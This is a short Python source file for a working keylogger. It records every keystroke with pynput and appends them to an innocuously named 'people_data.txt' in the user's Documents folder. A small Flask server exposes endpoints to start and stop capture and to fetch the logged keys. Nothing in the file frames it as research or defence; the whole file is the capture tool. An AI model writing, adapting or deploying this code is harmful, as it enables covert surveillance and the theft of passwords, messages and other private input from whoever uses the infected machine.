import os
import threading
from datetime import datetime
from pynput import keyboard
from flask import Flask, request

# Setup storage path in Documents
documents_path = os.path.join(os.path.expanduser("~"), "Documents")
os.makedirs(documents_path, exist_ok=True)
people_file_path = os.path.join(documents_path, "people_data.txt")

# Runtime state
data_buffer = []
capture_enabled = False
kill_switch = False

# Flask control app
app = Flask(__name__)

@app.route('/start', methods=['POST'])
def start_capture():
    global capture_enabled
    capture_enabled = True
    return "Capture started", 200

@app.route('/stop', methods=['POST'])
def stop_capture():
    global capture_enabled
    capture_enabled = False
    return "Capture stopped", 200

@app.route('/getpeople', methods=['GET'])
def get_people():
    return ''.join(data_buffer), 200

def write_data(data):
    with open(people_file_path, "a", encoding="utf-8") as f:
        f.write(data)

def on_key_press(key):
    global kill_switch

    if not capture_enabled:
        return

    try:
        key_str = key.char
    except AttributeError:
        key_str = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.esc: "[ESC]"
        }.get(key, f"[{key.name.upper()}]")

        if key == keyboard.Key.esc:
            print("[INFO] ESC pressed. Exiting.")
            kill_switch = True
            return False

    data_buffer.append(key_str)
    write_data(key_str)

def run_flask():
    app.run(port=5000, debug=False)

if __name__ == '__main__':
    print(f"[INFO] Agent running. Data stored at: {people_file_path}")

    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

    print("[INFO] Agent stopped.")
